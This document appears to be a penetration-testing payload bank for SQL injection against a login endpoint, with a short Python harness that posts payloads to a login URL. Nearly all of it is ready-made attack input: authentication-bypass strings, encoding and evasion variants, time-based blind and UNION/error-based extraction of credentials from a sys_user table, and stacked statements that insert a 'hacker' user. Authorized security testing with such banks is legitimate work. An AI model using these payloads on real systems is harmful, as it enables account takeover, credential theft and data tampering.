# SQL Injection Payload Bank

Use this bank when testing login, search, or any endpoint that accepts a string that might be used in a SQL query. Always compare against a baseline request first.

## Baseline requests

```json
{"userName": "admin", "password": "123456"}
{"userName": "admin", "password": ""}
{"userName": "notexist_user_xxx", "password": "123456"}
```

## Classic payloads

```json
{"userName": "admin", "password": "' OR '1'='1"}
{"userName": "admin", "password": "' OR '1'='1' --"}
{"userName": "admin", "password": "' OR '1'='1' #"}
{"userName": "admin", "password": "\" OR \"1\"=\"1\" --"}
{"userName": "admin", "password": "1' OR 1=1 --"}
{"userName": "admin", "password": "') OR ('1'='1"}
{"userName": "admin' OR '1'='1' LIMIT 1 --", "password": "123456"}
{"userName": "admin' --", "password": "anything"}
{"userName": "admin' #", "password": "anything"}
{"userName": "' OR '1'='1", "password": "' OR '1'='1"}
{"userName": "1' UNION SELECT 1,userName,password FROM sys_user --", "password": "123456"}
```

## Advanced / evasion payloads

```json
{"userName": "admin'/**/OR/**/'1'='1", "password": "123456"}
{"userName": "admin' oR '1'='1' --", "password": "123456"}
{"userName": "admin%27%20OR%20%271%27%3D%271", "password": "123456"}
{"userName": "admin%2527%2520OR%2520%25271%2527%253D%25271", "password": "123456"}
{"userName": "admin＇ OR ＇1＇=＇1", "password": "123456"}
{"userName": "admin\u0027\u0020OR\u0020\u00271\u0027=\u00271", "password": "123456"}
{"userName": "admin\x27\x20OR\x20\x271\x27=\x271", "password": "123456"}
{"userName": "admin\x00' OR '1'='1", "password": "123456"}
{"userName": "ad%", "password": "123456"}
{"userName": "admi_", "password": "123456"}
{"userName": "admin", "password": "' OR ASCII('A')=65 --"}
{"userName": "admin", "password": "' OR CONCAT('1','1')='11' --"}
{"userName": "admin", "password": "' OR CHAR(49)=CHAR(49) --"}
{"userName": "admin", "password": "' OR 1 IS NOT NULL --"}
{"userName": "admin", "password": "' OR 1 BETWEEN 1 AND 1 --"}
{"userName": "admin", "password": "') OR 1 IN (1) --"}
{"userName": "admin", "password": "' OR 1 LIKE 1 --"}
{"userName": "admin", "password": "' OR 'a' RLIKE 'a' --"}
{"userName": "admin", "password": "' OR 'a' REGEXP 'a' --"}
{"userName": "admin", "password": "' OR MATCH('admin') AGAINST('admin') --"}
```

## Time-based blind payloads

Compare response time against baseline. A delay of ~N seconds indicates the database executed the function.

```json
{"userName": "admin' AND SLEEP(0) --", "password": "123456"}
{"userName": "admin' AND SLEEP(2) --", "password": "123456"}
{"userName": "admin' AND SLEEP(5) --", "password": "123456"}
{"userName": "admin' AND BENCHMARK(1,MD5('a')) --", "password": "123456"}
{"userName": "admin' AND BENCHMARK(100000,MD5('a')) --", "password": "123456"}
{"userName": "admin' AND pg_sleep(0) --", "password": "123456"}
{"userName": "admin' AND pg_sleep(2) --", "password": "123456"}
{"userName": "admin'; WAITFOR DELAY '0:0:0' --", "password": "123456"}
{"userName": "admin'; WAITFOR DELAY '0:0:2' --", "password": "123456"}
{"userName": "admin' AND IF(1=1,SLEEP(2),0) --", "password": "123456"}
{"userName": "admin' AND IF(1=2,SLEEP(2),0) --", "password": "123456"}
{"userName": "admin' AND CASE WHEN 1=1 THEN pg_sleep(2) ELSE pg_sleep(0) END --", "password": "123456"}
{"userName": "admin'; IF 1=1 WAITFOR DELAY '0:0:2' --", "password": "123456"}
{"userName": "admin' AND randomblob(10000) --", "password": "123456"}
{"userName": "admin' AND randomblob(1000000000) --", "password": "123456"}
```

## Error-based / Union payloads

```json
{"userName": "admin'", "password": "123456"}
{"userName": "admin\"", "password": "123456"}
{"userName": "admin' UNION SELECT 1 --", "password": "123456"}
{"userName": "admin' UNION SELECT 1,2 --", "password": "123456"}
{"userName": "admin' UNION SELECT 1,2,3 --", "password": "123456"}
{"userName": "admin' UNION SELECT 1,2,3,4 --", "password": "123456"}
{"userName": "admin' UNION SELECT 1,2,3,4,5 --", "password": "123456"}
{"userName": "admin' UNION SELECT 1,table_name,3 FROM information_schema.tables --", "password": "123456"}
{"userName": "admin' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='sys_user' --", "password": "123456"}
{"userName": "admin' AND extractvalue(1, concat(0x7e, (SELECT @@version))) --", "password": "123456"}
{"userName": "admin' AND updatexml(1, concat(0x7e, database()), 1) --", "password": "123456"}
{"userName": "admin' AND 1=CONVERT(int,@@version) --", "password": "123456"}
{"userName": "admin' AND 1=CAST((SELECT version()) AS INTEGER) --", "password": "123456"}
{"userName": "admin' AND 1=(SELECT 1 FROM sqlite_master) --", "password": "123456"}
{"userName": "admin' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) --", "password": "123456"}
```

## Stacked / multi-statement payloads

Only attempt against test databases; never run on production or shared data.

```json
{"userName": "admin'; SELECT * FROM sys_user --", "password": "123456"}
{"userName": "admin'; SELECT userName,password FROM sys_user --", "password": "123456"}
{"userName": "admin'; SELECT TOP 1 userName FROM sys_user --", "password": "123456"}
{"userName": "admin'; INSERT INTO sys_user (userName) VALUES ('hacker') --", "password": "123456"}
```

## Python test harness

```python
import requests
import json
import time

url = "https://your-test-env/api/sys/user/login"

payloads = [
    {"userName": "admin", "password": "' OR '1'='1"},
    {"userName": "admin' OR '1'='1' LIMIT 1 --", "password": "123456"},
    {"userName": "admin' AND SLEEP(5) --", "password": "123456"},
]

for p in payloads:
    start = time.time()
    resp = requests.post(url, json=p, timeout=20)
    elapsed = time.time() - start
    print(f"{p} -> {resp.status_code} in {elapsed:.2f}s: {resp.text[:100]}")
```

## Interpreting results

| Observation | Meaning |
|-------------|---------|
| 400/401 with generic error | Likely safe |
| 200 with token | Possible bypass |
| SQL error in body | Vulnerable + information disclosure |
| Response time jumps ~5s | Time-based SQLI likely |
| Response length differs for true/false conditions | Boolean blind SQLI possible |
| 500 server error | Investigate; may indicate SQL error or unhandled exception |
